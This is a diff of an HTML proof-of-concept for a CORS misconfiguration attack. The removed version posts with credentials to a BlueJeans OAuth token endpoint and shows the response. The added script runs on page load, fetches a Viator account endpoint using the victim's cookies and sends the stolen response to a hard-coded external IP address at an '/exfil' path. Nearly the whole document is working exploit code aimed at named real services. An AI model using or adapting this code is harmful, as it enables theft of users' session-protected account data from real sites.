@@ -1,27 +1,17 @@
-<!DOCTYPE html>
-<html>
-   <head>
-      <script>
-         function cors() {
-            var xhttp = new XMLHttpRequest();
-                xhttp.onreadystatechange = function() {
-                    if (this.readyState == 4 && this.status == 200) {
-                        document.getElementById("demo").innerHTML = alert(this.responseText);
-            }
-         };
-         xhttp.open("POST", "https://bluejeans.com/seamapi/oauth2/token", true);
-         xhttp.withCredentials = true;
-         xhttp.send();
-         }
-      </script>
-   </head>
-   <body>
-      <center>
-      <h2>CORS PoC Exploit </h2>
-      <h3>created by <a href="https://twitter.com/Jarvis7717">@Jarvis</a></h3>
-      <h3>Show full content of page</h3>
-      <div id="demo">
-         <button type="button" onclick="cors()">Exploit</button>
-      </div>
-   </body>
-</html>
+<script>
+const TARGET_API = "https://www.viator.com/api/me";  // or whatever endpoint you found
+const EXFIL_URL = "http://117.102.66.28:8080/exfil";
+
+async function exploit() {
+  try {
+    const r = await fetch(TARGET_API, { credentials: 'include', mode: 'cors' });
+    const data = await r.text();
+    // Exfil
+    fetch(`${EXFIL_URL}?data=${encodeURIComponent(data)}`, { mode: 'no-cors' });
+    document.getElementById('s').innerHTML = `✅ Data stolen: ${data.length} chars`;
+  } catch(e) {
+    document.getElementById('s').innerHTML = `❌ Failed: ${e.message}`;
+  }
+}
+exploit();
+</script>
